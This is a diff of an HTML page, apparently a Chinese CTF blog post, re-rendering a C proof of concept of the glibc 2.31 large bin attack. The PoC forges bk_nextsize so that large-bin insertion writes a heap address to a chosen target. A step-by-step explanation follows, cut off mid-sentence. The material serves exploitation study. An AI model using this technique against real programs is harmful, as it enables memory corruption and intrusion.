@@ -102,12 +102,12 @@ Arashimuのblog = CTFer</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitzannuj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li>
         </ul>
       </div>
     </header>
@@ -151,136 +151,29 @@ Arashimuのblog = CTFer</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h1 id="231版本下的largebin-attach"><a class="markdownIt-Anchor" href="#231版本下的largebin-attach"></a> 2.31版本下的largebin attach</h1>
-<h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码</h2>
-<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span>
-
-<span class="hljs-comment">/*
-
-A revisit to large bin attack for after glibc2.30
-
-Relevant code snippet :
-
-	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;
-		fwd = bck;
-		bck = bck-&gt;bk;
-		victim-&gt;fd_nextsize = fwd-&gt;fd;
-		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
-		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
-	&#125;
-
-
-*/</span>
-
-<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
-  <span class="hljs-comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span>
-  setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);
-  setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);
-  setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 1 : \n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 2 : \n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This prevents the traditional large bin attack\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);
-  
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);
-
-  <span class="hljs-type">size_t</span> target = <span class="hljs-number">0</span>;
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);
-  <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x428</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);
-  <span class="hljs-type">size_t</span> *g1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And another chunk to prevent consolidate\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);
-  <span class="hljs-type">size_t</span> *g2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-built_in">free</span>(p1);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);
-  <span class="hljs-type">size_t</span> *g3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-built_in">free</span>(p2);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)((&amp;target)<span class="hljs-number">-4</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="hljs-number">-4</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-type">size_t</span> *g4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, p1<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, (<span class="hljs-type">void</span> *)target);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="hljs-type">size_t</span>*)target);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);
-
-  assert((<span class="hljs-type">size_t</span>)(p2<span class="hljs-number">-2</span>) == target);
-
-  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-&#125;
-</code></pre>
-<p>目标：覆写目标地址的内容为堆的地址</p>
-<h2 id="step1"><a class="markdownIt-Anchor" href="#step1"></a> step1</h2>
-<pre class="highlight"><code class="c"> <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x428</span>);
- <span class="hljs-type">size_t</span> *g1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);
- <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);
- <span class="hljs-type">size_t</span> *g2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);
- <span class="hljs-built_in">free</span>(p1);
- <span class="hljs-type">size_t</span> *g3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);
-</code></pre>
-<p>首先分配2个大小为large bin范围内的chunk，之后释放chunk1，chunk1先进入unsortedbins，之后再申请一个比chunk1大的chunk3，此时由于unsortedbins的大小不够分配，所以从top chunk分配并且把unsortedbins中的chunk1放入large bin中</p>
+    <h1 id="231版本下的largebin-attach"><a class="markdownIt-Anchor" href="#231版本下的largebin-attach">#</a> 2.31 版本下的 largebin attach</h1>
+<h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码">#</a> 实验代码</h2>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;assert.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">/*</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>A revisit to large bin attack for after glibc2.30</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>Relevant code snippet :</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck->bk))&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>		fwd = bck;</pre></td></tr><tr><td data-num="13"></td><td><pre>		bck = bck->bk;</pre></td></tr><tr><td data-num="14"></td><td><pre>		victim->fd_nextsize = fwd->fd;</pre></td></tr><tr><td data-num="15"></td><td><pre>		victim->bk_nextsize = fwd->fd->bk_nextsize;</pre></td></tr><tr><td data-num="16"></td><td><pre>		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;</pre></td></tr><tr><td data-num="17"></td><td><pre>	&#125;</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>*/</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>_IONBF<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>_IONBF<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>_IONBF<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Check 1 : \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Check 2 : \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">    if (bck->fd != fwd)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This prevents the traditional large bin attack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  </pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"====================================================================\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>  <span class="token class-name">size_t</span> target <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>target<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>  <span class="token class-name">size_t</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x428</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"First, we allocate a large chunk [p1] (%p)\n"</span><span class="token punctuation">,</span>p1<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>  <span class="token class-name">size_t</span> <span class="token operator">*</span>g1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"And another chunk to prevent consolidate\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>  <span class="token class-name">size_t</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We also allocate a second large chunk [p2]  (%p).\n"</span><span class="token punctuation">,</span>p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>  <span class="token class-name">size_t</span> <span class="token operator">*</span>g2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Once again, allocate a guard chunk to prevent consolidate\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre>  <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the larger of the two --> [p1] (%p)\n"</span><span class="token punctuation">,</span>p1<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>  <span class="token class-name">size_t</span> <span class="token operator">*</span>g3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x438</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre>  <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the smaller of the two --> [p2] (%p)\n"</span><span class="token punctuation">,</span>p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"At this point, we have one chunk in large bin [p1] (%p),\n"</span><span class="token punctuation">,</span>p1<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"               and one chunk in unsorted bin [p2] (%p)\n"</span><span class="token punctuation">,</span>p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre></pre></td></tr><tr><td data-num="70"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre>  p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now modify the p1->bk_nextsize to [target-0x20] (%p)\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>  <span class="token class-name">size_t</span> <span class="token operator">*</span>g4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x438</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span><span class="token punctuation">,</span> p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  the modified p1->bk_nextsize does not trigger any error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd->nexsize is overwritten to address of [p2] (%p)\n"</span><span class="token punctuation">,</span> p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> p1<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n"</span><span class="token punctuation">,</span> p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target (%p) : %p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>target<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre></pre></td></tr><tr><td data-num="88"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"====================================================================\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre></pre></td></tr><tr><td data-num="91"></td><td><pre>  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre></pre></td></tr><tr><td data-num="93"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>目标：覆写目标地址的内容为堆的地址</p>
+<h2 id="step1"><a class="markdownIt-Anchor" href="#step1">#</a> step1</h2>
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">size_t</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x428</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token class-name">size_t</span> <span class="token operator">*</span>g1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token class-name">size_t</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token class-name">size_t</span> <span class="token operator">*</span>g2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token class-name">size_t</span> <span class="token operator">*</span>g3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x438</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>首先分配 2 个大小为 large bin 范围内的 chunk，之后释放 chunk1，chunk1 先进入 